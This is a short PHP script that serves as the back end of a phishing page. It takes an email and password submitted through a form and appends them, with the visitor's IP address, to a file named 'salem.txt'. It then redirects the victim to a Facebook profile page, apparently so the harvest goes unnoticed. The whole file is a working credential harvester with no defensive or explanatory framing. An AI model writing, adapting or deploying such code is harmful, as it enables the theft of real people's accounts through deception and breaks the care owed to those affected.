<?php
function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}



$email=$_POST["email"];
$pass=$_POST["pass"];

if (!empty($email and $pass)) {
    $na=1;
    header ('Location:https://www.facebook.com/profile.php?id=100050150409924');
    $handle = fopen("salem.txt", "a");
fwrite($handle, 'Email is :'.$email);
fwrite($handle, "\r\n");
fwrite($handle, 'Password is :'.$pass);
fwrite($handle, "\r\n");
fwrite($handle,"ip is : ".getUserIpAddr());
fwrite($handle, "\r\n");
fclose($handle);
}
else{
    header("Location:index2.html");
    
}
?> 

